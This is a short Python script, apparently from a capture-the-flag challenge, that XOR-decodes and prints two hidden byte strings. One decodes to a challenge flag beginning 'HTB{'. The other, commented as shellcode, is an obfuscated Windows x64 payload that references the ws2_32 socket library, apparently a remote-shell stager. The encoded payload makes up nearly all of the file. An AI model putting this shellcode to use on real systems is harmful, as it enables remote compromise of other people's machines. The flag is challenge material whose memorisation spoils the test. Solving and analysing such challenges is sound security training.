#!/usr/bin/env python3

stage1 = bytearray(b'\x99\x85\x93\xaa\xb3\xe2\xa6\xb9\xe5\xa3\xe2\x8e\xe1\xb7\x8e\xa5\xb9\xe2\x8e\xb3')
stage2 = bytearray(b'\xac\xff\xff\xff\xe2\xb2\xe0\xa5\xa2\xa4\xbb\x8e\xb7\xe1\x8e\xe4\xa5\xe1\xe1')

stage2.reverse()

something = bytearray(b'\x2d\x99\x52\x35\x21\x39\x1d\xd1\xd1\xd1\x90\x80\x90\x81\x83\x99\xe0\x03\xb4\x99\x5a\x83\xb1\x99\x5a\x83\xc9\x80\x87\x99\x5a\x83\xf1\x99\xde\x66\x9b\x9b\x9c\xe0\x18\x99\x5a\xa3\x81\x99\xe0\x11\x7d\xed\xb0\xad\xd3\xfd\xf1\x90\x10\x18\xdc\x90\xd0\x10\x33\x3c\x83\x99\x5a\x83\xf1\x90\x80\x5a\x93\xed\x99\xd0\x01\xb7\x50\xa9\xc9\xda\xd3\xde\x54\xa3\xd1\xd1\xd1\x5a\x51\x59\xd1\xd1\xd1\x99\x54\x11\xa5\xb6\x99\xd0\x01\x5a\x99\xc9\x81\x95\x5a\x91\xf1\x98\xd0\x01\x32\x87\x99\x2e\x18\x9c\xe0\x18\x90\x5a\xe5\x59\x99\xd0\x07\x99\xe0\x11\x90\x10\x18\xdc\x7d\x90\xd0\x10\xe9\x31\xa4\x20\x9d\xd2\x9d\xf5\xd9\x94\xe8\x00\xa4\x09\x89\x95\x5a\x91\xf5\x98\xd0\x01\xb7\x90\x5a\xdd\x99\x95\x5a\x91\xcd\x98\xd0\x01\x90\x5a\xd5\x59\x90\x89\x90\x89\x8f\x88\x99\xd0\x01\x8b\x90\x89\x90\x88\x90\x8b\x99\x52\x3d\xf1\x90\x83\x2e\x31\x89\x90\x88\x8b\x99\x5a\xc3\x38\x9a\x2e\x2e\x2e\x8c\x98\x6f\xa6\xa2\xe3\x8e\xe2\xe3\xd1\xd1\x90\x87\x98\x58\x37\x99\x50\x3d\x71\xd0\xd1\xd1\x98\x58\x34\x98\x6d\xd3\xd1\xd4\xe8\x11\x79\xd1\xc3\x90\x85\x98\x58\x35\x9d\x58\x20\x90\x6b\x9d\xa6\xf7\xd6\x2e\x04\x9d\x58\x3b\xb9\xd0\xd0\xd1\xd1\x88\x90\x6b\xf8\x51\xba\xd1\x2e\x04\xbb\xdb\x90\x8f\x81\x81\x9c\xe0\x18\x9c\xe0\x11\x99\x2e\x11\x99\x58\x13\x99\x2e\x11\x99\x58\x10\x90\x6b\x3b\xde\x0e\x31\x2e\x04\x99\x58\x16\xbb\xc1\x90\x89\x9d\x58\x33\x99\x58\x28\x90\x6b\x48\x74\xa5\xb0\x2e\x04\x54\x11\xa5\xdb\x98\x2e\x1f\xa4\x34\x39\x42\xd1\xd1\xd1\x99\x52\x3d\xc1\x99\x58\x33\x9c\xe0\x18\xbb\xd5\x90\x89\x99\x58\x28\x90\x6b\xd3\x08\x19\x8e\x2e\x04\x52\x29\xd1\xaf\x84\x99\x52\x15\xf1\x8f\x58\x27\xbb\x91\x90\x88\xb9\xd1\xc1\xd1\xd1\x90\x89\x99\x58\x23\x99\xe0\x18\x90\x6b\x89\x75\x82\x34\x2e\x04\x99\x58\x12\x98\x58\x16\x9c\xe0\x18\x98\x58\x21\x99\x58\x0b\x99\x58\x28\x90\x6b\xd3\x08\x19\x8e\x2e\x04\x52\x29\xd1\xac\xf9\x89\x90\x86\x88\xb9\xd1\x91\xd1\xd1\x90\x89\xbb\xd1\x8b\x90\x6b\xda\xfe\xde\xe1\x2e\x04\x86\x88\x90\x6b\xa4\xbf\x9c\xb0\x2e\x04\x98\x2e\x1f\x38\xed\x2e\x2e\x2e\x99\xd0\x12\x99\xf8\x17\x99\x54\x27\xa4\x65\x90\x2e\x36\x89\xbb\xd1\x88\x98\x16\x13\x21\x64\x73\x87\x2e\x04')

stage3 = bytearray(stage1 + stage2)

# Unpack Shellcode;
for i in range(len(something)):
	something[i] = something[i] ^ 0xd1;

#Unpack Special Orders!
for i in range(len(stage3)):
	stage3[i] = stage3[i] ^ 0xd1;
   
print(something)
print(stage3)